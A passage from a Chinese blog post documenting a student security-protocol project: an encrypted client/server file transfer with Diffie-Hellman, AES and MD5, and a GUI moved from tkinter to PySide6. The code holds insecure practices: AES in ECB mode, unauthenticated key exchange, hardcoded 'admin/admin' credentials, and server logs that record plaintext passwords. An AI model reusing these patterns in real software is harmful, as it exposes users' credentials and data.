main()</span><br></pre></td></tr></table></figure><p>创建出一个canvas控件后 还需要创建一个内部窗口 用来显示文本或者图片<br>scrollbar绑定的是canvas 但是输出的文本还是依靠label<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411122050247.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411122050247.png" alt="image.png"></a></p><h3 id="tkinter实际利用"><a href="#tkinter实际利用" class="headerlink" title="tkinter实际利用"></a>tkinter实际利用</h3><p>基于tk来实现图形化界面 现在主要是卡在滚动条的实现 本来预期是打算设计成<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411131014001.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411131014001.png" alt="image.png"></a><br>上面部分用来显示操作界面 下面用来输出信息<br>然后下面的部分本来想着是加一个滚动条来查看输出信息过多的情况下以往的输出信息<br>但是tk的滚动条实现起来实在有点太麻烦了 而且tk的美观程度也很差 就是因为他的控件布局太难用了 所以写到这里就烂尾了 看看后面还有没有兴趣搞下去吧 暂时是打算转用pyside6了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">from tkinter import *</span><br><span class="line">from PIL import Image, ImageTk</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from tkinter.ttk import Separator</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_message_to_frame2(frame2, text, row=None, column=0, sticky=W):</span><br><span class="line">    &quot;&quot;&quot;统一处理向frame2添加消息的函数&quot;&quot;&quot;</span><br><span class="line">    if not hasattr(frame2, &#x27;current_row&#x27;):</span><br><span class="line">        frame2.current_row = 0</span><br><span class="line">    if not hasattr(frame2, &#x27;max_rows&#x27;):</span><br><span class="line">        frame2.max_rows = 5</span><br><span class="line">    </span><br><span class="line">    if row is None:</span><br><span class="line">        row = frame2.current_row</span><br><span class="line">    </span><br><span class="line">    # 如果超过最大行数，清除所有控件并重置行计数</span><br><span class="line">    if frame2.current_row &gt;= frame2.max_rows:</span><br><span class="line">        for widget in frame2.winfo_children():</span><br><span class="line">            widget.destroy()</span><br><span class="line">        frame2.current_row = 0</span><br><span class="line">        </span><br><span class="line">    Label(frame2, text=text, bg=&quot;white&quot;).grid(row=frame2.current_row, column=column, sticky=sticky)</span><br><span class="line">    frame2.current_row += 1</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):  #md5加密 用于完整性检测 </span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,data,shared_key,sliced,sum):  #将数据打包成报文 格式:  sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes)</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,data)</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp </span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(private_key_client,frame1,frame2,ipaddr,s,public_key_client):   #交换公钥</span><br><span class="line">    ip = ipaddr.get()</span><br><span class="line">    s.connect((ip,6666))</span><br><span class="line">    add_message_to_frame2(frame2, &quot;连接上服务端 开始进行公钥交换&quot;)</span><br><span class="line">    </span><br><span class="line">    for widget in frame1.winfo_children():</span><br><span class="line">        widget.destroy()</span><br><span class="line">    </span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(   </span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    public_key_server = serialization.load_pem_public_key(public_key_server)</span><br><span class="line">    add_message_to_frame2(frame2, &quot;公钥交换成功,开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key,frame1,frame2)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):  #aes加密</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    data_bytes = pad(data, AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def finish_connect(s):</span><br><span class="line">    s.close()</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">def menu(s,shared_key,frame1,frame2):</span><br><span class="line">    for widget in frame1.winfo_children():</span><br><span class="line">        widget.destroy()</span><br><span class="line">    button1 = Button(frame1,text=&quot;传输文本&quot;,command=lambda:transfer_txt(s,shared_key,frame1,frame2)).grid(row=0,column=0,padx=60,pady=20)</span><br><span class="line">    button2 = Button(frame1,text=&quot;传输文件&quot;,command=lambda:transfer_file(s,shared_key)).grid(row=0,column=1)</span><br><span class="line">    button3 = Button(frame1,text=&quot;注册用户&quot;,command=lambda:register(s,shared_key)).grid(row=1,column=0)</span><br><span class="line">    button4 = Button(frame1,text=&quot;退出程序&quot;,command=lambda:finish_connect(s)).grid(row=1,column=1)</span><br><span class="line"></span><br><span class="line">def login(entry1,entry2,s,shared_key,frame2,frame1):</span><br><span class="line">    username = entry1.get()</span><br><span class="line">    password = entry2.get()</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    transfer_data = encrypt_data(shared_key,data)  #使用aes加密账号密码</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line">    text = (s.recv(1024)).decode()</span><br><span class="line">    </span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        add_message_to_frame2(frame2, text)</span><br><span class="line">        s.close()</span><br><span class="line">    elif text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">        add_message_to_frame2(frame2, text)</span><br><span class="line">        s.close()</span><br><span class="line">    else:</span><br><span class="line">        add_message_to_frame2(frame2, text)</span><br><span class="line">        menu(s,shared_key,frame1,frame2)</span><br><span class="line"></span><br><span class="line">def focus_next(entry):</span><br><span class="line">    entry.focus()</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key,frame1,frame2):</span><br><span class="line">    add_message_to_frame2(frame2, &quot;开始进行身份验证&quot;)</span><br><span class="line">    Label(frame1,text=&quot;用户名&quot;).grid(row=0,pady=30)</span><br><span class="line">    Label(frame1,text=&quot;密码&quot;).grid(row=1)</span><br><span class="line">    entry1 = Entry(frame1)</span><br><span class="line">    entry1.grid(row=0,column=1,padx=10)</span><br><span class="line">    entry2 = Entry(frame1)</span><br><span class="line">    entry1.bind(&quot;&lt;Return&gt;&quot;,lambda event:focus_next(entry2))</span><br><span class="line">    entry2.grid(row=1,column=1,padx=10)</span><br><span class="line">    entry2.bind(&quot;&lt;Return&gt;&quot;,lambda event:login(entry1,entry2,s,shared_key,frame2,frame1))</span><br><span class="line">    Button(frame1,text=&quot;登录&quot;,height=3,width=7,command=lambda : login(entry1,entry2,s,shared_key,frame2,frame1)).grid(row=0,column=2,rowspan=2,pady=(30,0))</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line">def register(s,shared_key):</span><br><span class="line">    username = input(&quot;输入用户名 :&quot;)   #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理</span><br><span class="line">    password = input(&quot;输入密码 :&quot;)</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    transfer_data = pack_data(3,data,shared_key,0,0)</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line"></span><br><span class="line">def transfer_txt1(entry1,s,shared_key,frame2):</span><br><span class="line">    text = entry1.get(&#x27;1.0&#x27;,END)</span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum)</span><br><span class="line">            sliced += 1</span><br><span class="line">            try:</span><br><span class="line">                s.send(transfer_data)</span><br><span class="line">                add_message_to_frame2(frame2, &quot;发送成功&quot;)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                add_message_to_frame2(frame2, f&quot;发送失败,错误信息:&#123;e&#125;&quot;)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        try:</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">            add_message_to_frame2(frame2, &quot;发送成功&quot;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            add_message_to_frame2(frame2, f&quot;发送失败,错误信息:&#123;e&#125;&quot;)</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key,frame1,frame2):  #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 </span><br><span class="line">    for widget in frame1.winfo_children():</span><br><span class="line">        widget.destroy()</span><br><span class="line">    s1 = Scrollbar(frame1,width=20)</span><br><span class="line">    Label(frame1,text=&quot;传输数据:&quot;).grid(row=0,column=0,sticky=W,padx=5)</span><br><span class="line">    s1.grid(row=1,column=1,sticky=NS)</span><br><span class="line">    text = Text(frame1,width=38,height=6,yscrollcommand=s1.set,wrap=CHAR)</span><br><span class="line">    text.grid(row=1,column=0,padx=5)</span><br><span class="line">    Button(frame1,command=lambda:transfer_txt1(text,s,shared_key,frame2),text=&quot;发送&quot;).grid(row=2,column=0,pady=5,sticky=E)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key):</span><br><span class="line">    file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    transfer_data = []</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\n&quot;)</span><br><span class="line">        begin_time = time.time()</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            sliced += 1</span><br><span class="line">            transfer_data.append(pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum))</span><br><span class="line">        for i in range(sliced_sum):</span><br><span class="line">            s.sendall(transfer_data[i])</span><br><span class="line">            time.sleep(0.06)</span><br><span class="line">            currect_time = time.time()</span><br><span class="line">            temp = currect_time-begin_time</span><br><span class="line">            print(&quot;\r&quot;+f&quot;正在传输第&#123;i+1&#125;组 当前运行了&#123;temp:.2f&#125;s&quot;,end=&quot;&quot;)</span><br><span class="line">        print(&quot;\n&quot;,end=&quot;&quot;)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    </span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    root = Tk()</span><br><span class="line">    root.title(&quot;协议大作业-第六组&quot;)</span><br><span class="line">    root.geometry(&quot;300x300&quot;)</span><br><span class="line">    </span><br><span class="line">    frame1 = Frame(root,width=300,height=150)</span><br><span class="line">    frame2 = Frame(root,width=300,height=150,bg=&quot;white&quot;)</span><br><span class="line">    frame2.current_row = 0</span><br><span class="line">    frame2.max_rows = 6  # 设置最大显示行数</span><br><span class="line">    </span><br><span class="line">    Label(frame1,text=&quot;ip地址:&quot;).grid(row=0,padx=10,pady=50)  #输入ip地址</span><br><span class="line">    ipaddr = Entry(frame1)</span><br><span class="line">    ipaddr.bind(&quot;&lt;Return&gt;&quot;,lambda event:key_switch(private_key_client,frame1,frame2,ipaddr,s,public_key_client))</span><br><span class="line">    ipaddr.grid(row=0,column=1)</span><br><span class="line">    Button(frame1,text=&quot;连接&quot;,command=lambda: key_switch(private_key_client,frame1,frame2,ipaddr,s,public_key_client),width=10).grid(row=0,column=2,padx=10)</span><br><span class="line">    </span><br><span class="line">    frame1.grid(row=0)</span><br><span class="line">    frame1.grid_propagate(0)</span><br><span class="line">    frame2.grid(row=2)</span><br><span class="line">    frame2.grid_propagate(0)</span><br><span class="line">    </span><br><span class="line">    separator = Frame(root, height=2, bd=1, relief=SUNKEN) #分割线</span><br><span class="line">    separator.grid(row=1, column=0, sticky=EW)</span><br><span class="line">    </span><br><span class="line">    root.mainloop()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="pyside6学习"><a href="#pyside6学习" class="headerlink" title="pyside6学习"></a>pyside6学习</h3><h4 id="简单窗口显示"><a href="#简单窗口显示" class="headerlink" title="简单窗口显示"></a>简单窗口显示</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PySide6.QtWidgets import *</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = QWidget()</span><br><span class="line">    </span><br><span class="line">    window.setWindowTitle(&quot;安全协议大作业&quot;)</span><br><span class="line">    window.setFixedSize(400,300)</span><br><span class="line">    </span><br><span class="line">    label = QLabel(&quot;测试输出&quot;,window)</span><br><span class="line">    label.move(175,125)</span><br><span class="line">    </span><br><span class="line">    window.show()</span><br><span class="line">    app.exec()</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>上述程序可以创建出一个窗口后简单的输出文字 总体的逻辑是和tk差不多的<br>需要创建一个窗口对象 然后给窗口增加控件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411131028279.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411131028279.png" alt="image.png"></a></p><h4 id="qt-designer"><a href="#qt-designer" class="headerlink" title="qt designer"></a>qt designer</h4><p>我觉得pyside6相较于tk最显著的优势就是 可以使用编辑工具来简化ui的设计<br>如图所示 设计一个简单的ui<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411131103104.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411131103104.png" alt="image.png"></a><br>保存ui文件 在程序中载入ui 然后加载到一个窗口上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PySide6.QtWidgets import *</span><br><span class="line">from PySide6.QtCore import QFile, QIODevice</span><br><span class="line">from PySide6.QtUiTools import QUiLoader</span><br><span class="line">from PySide6.QtWidgets import QApplication</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    ui_file = QFile(&quot;test.ui&quot;)</span><br><span class="line">    loader = QUiLoader()</span><br><span class="line">    </span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = loader.load(ui_file)</span><br><span class="line">    </span><br><span class="line">    window.setWindowTitle(&quot;安全协议大作业&quot;)</span><br><span class="line">    # window.setFixedSize(400,300)</span><br><span class="line">    </span><br><span class="line">    ui_file.close()</span><br><span class="line">    </span><br><span class="line">    window.show()</span><br><span class="line">    app.exec()</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411131105114.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411131105114.png" alt="image.png"></a><br>可以看到非常简单的就实现了这几个控件 比tk挪半天位置好用多了  tk是人用的吗???</p><h4 id="函数绑定"><a href="#函数绑定" class="headerlink" title="函数绑定"></a>函数绑定</h4><p>解决了ui设计的难题后 接下来的重点就是放在函数的绑定上 其实也很简单 就是要注意自己在qt designer中定义的控件名称<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411132010995.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411132010995.png" alt="image.png"></a><br>然后需要把ui文件转化成py文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyside6-uic filename.ui -o filename.py</span><br></pre></td></tr></table></figure><p>随后在程序中直接导入即可<br>然后函数绑定的大体上是和tk一致的 具体到各个控件的方法有些不太一样 就有需求的自己查询 这里放一个我自己弄的账号密码登录程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PySide6.QtWidgets import *</span><br><span class="line">from ui import Ui_Form</span><br><span class="line"></span><br><span class="line">class mywindow(QMainWindow,Ui_Form):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        </span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        </span><br><span class="line">        hide_pwd = self.checkBox.stateChanged.connect(lambda:self.hide_password())</span><br><span class="line">        login_button = self.b1.clicked.connect(lambda:self.login())</span><br><span class="line">        exit_button = self.pushButton_2.clicked.connect(lambda:self.exit_process())</span><br><span class="line">    </span><br><span class="line">    def exit_process(self):</span><br><span class="line">        exit()</span><br><span class="line">    </span><br><span class="line">    def hide_password(self):</span><br><span class="line">        state = self.lineEdit_2.echoMode()</span><br><span class="line">        if str(state) == &quot;EchoMode.Password&quot;:</span><br><span class="line">            self.lineEdit_2.setEchoMode(QLineEdit.EchoMode.Normal)</span><br><span class="line">        else :</span><br><span class="line">            self.lineEdit_2.setEchoMode(QLineEdit.EchoMode.Password)</span><br><span class="line">    </span><br><span class="line">    def login(self):</span><br><span class="line">        username = self.lineEdit.text()</span><br><span class="line">        password = self.lineEdit_2.text()</span><br><span class="line">        if username == &quot;admin&quot; and password == &quot;admin&quot;:</span><br><span class="line">            msg = &quot;登录成功&quot;</span><br><span class="line">            QMessageBox.information(self,&#x27;输出信息&#x27;,msg)</span><br><span class="line">        elif len(username)==0:</span><br><span class="line">            msg = &quot;必须输入账号&quot;</span><br><span class="line">            QMessageBox.information(self,&#x27;输出信息&#x27;,msg)</span><br><span class="line">        elif len(password) ==0:</span><br><span class="line">            msg = &quot;必须输入密码&quot;</span><br><span class="line">            QMessageBox.information(self,&#x27;输出信息&#x27;,msg)</span><br><span class="line">        elif username != &quot;admin&quot;:</span><br><span class="line">            msg = &quot;账号不存在&quot;</span><br><span class="line">            QMessageBox.information(self,&#x27;输出信息&#x27;,msg)</span><br><span class="line">        elif password != &quot;admin&quot;:</span><br><span class="line">            msg = &quot;密码错误&quot;</span><br><span class="line">            QMessageBox.information(self,&#x27;输出信息&#x27;,msg)</span><br><span class="line">    </span><br><span class="line">def main():</span><br><span class="line">    app = QApplication()</span><br><span class="line">    w1 = mywindow()</span><br><span class="line">    w1.show()</span><br><span class="line">    app.exec()</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>写这么久博客第一次放gif图 看起来画质一般般 而且也捕获不到弹出的第二个窗口 哎下次改进吧<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411132027681.gif" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411132027681.gif" alt="image.png"></a><br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411132028298.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411132028298.png" alt="image.png"></a></p><h3 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h3><p>v1.0版本最后采用了pyside6作为图形化界面框架 把客户端用图形化界面包了起来<br>同时为了配合客户端的优化 服务端也作了一些修改<br>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import magic</span><br><span class="line">import time</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">mime = magic.Magic(mime=True)</span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;开始传输数据&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def write_log(log_file,text):</span><br><span class="line">    current_time = time.asctime(time.localtime(time.time()))</span><br><span class="line">    text += &quot;   &quot;+current_time</span><br><span class="line">    log_file.write(text.encode()+b&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">class query_thread(threading.Thread):</span><br><span class="line">    </span><br><span class="line">    def __init__(self,name = None):</span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line"></span><br><span class="line">    def query_username(self,username):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def query_password(self,username,password):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def add_user(self,sock,username,password,addr,login_username,log_file):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (str(username), str(password)))</span><br><span class="line">            conn.commit()</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;已存在,注册失败&quot;)</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)失败 因为用户已存在&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line">        sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)成功 对应用户密码为(&#123;password&#125;)&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    if isinstance(data, str): </span><br><span class="line">        data = data.encode()  # md5加密需要bytes参数</span><br><span class="line">    md5_hash = hashlib.md5()  #md5加密</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def key_switch(sock,public_key_server):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;)</span><br><span class="line">    try:</span><br><span class="line">        public_key_client = sock.recv(1024)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;接受错误&quot;,e)</span><br><span class="line">    </span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(    #将客户端的公钥序列化为 PEM 格式的字节串</span><br><span class="line">    encoding=serialization.Encoding.PEM,  </span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):   #data要为byte型</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16))</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def unpack_data(sock,shared_key,orign_data,log_file,addr):     #拆解数据包</span><br><span class="line">    sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;)</span><br><span class="line">    sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_md5 = (orign_data[-32:]).decode()</span><br><span class="line">    data = decrypt_data(shared_key,orign_data[12:(data_length-32)])</span><br><span class="line">    value = verify_md5(data,data_md5)</span><br><span class="line">    if value == False:</span><br><span class="line">        fail_number = sliced_num</span><br><span class="line">    else:</span><br><span class="line">        fail_number = None</span><br><span class="line">    return sliced_sum,sliced_num,data_type,data,fail_number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Authentication(sock,shared_key,query_thread1,addr,log_file):  #身份验证部分 账号密码存储在users.db数据库中</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    en_data = (sock.recv(1024))</span><br><span class="line">    if len(en_data) == 0:</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        log_file.close()</span><br><span class="line">        sock.close()</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">        return</span><br><span class="line">    data = decrypt_data(shared_key,en_data)</span><br><span class="line">    parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">    username = parts[0].decode()</span><br><span class="line">    password = parts[1].decode()</span><br><span class="line">    result = query_thread1.query_username(username)</span><br><span class="line">    if result != None:</span><br><span class="line">        result = query_thread1.query_password(username,password)</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1    </span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0    </span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;使用用户名(&#123;username&#125;)密码(&#123;password&#125;)进行身份验证通过&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            return permission_value,username</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;)输入密码(&#123;password&#125;),密码错误登录失败&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            sock.close()</span><br><span class="line">            return 3,username</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 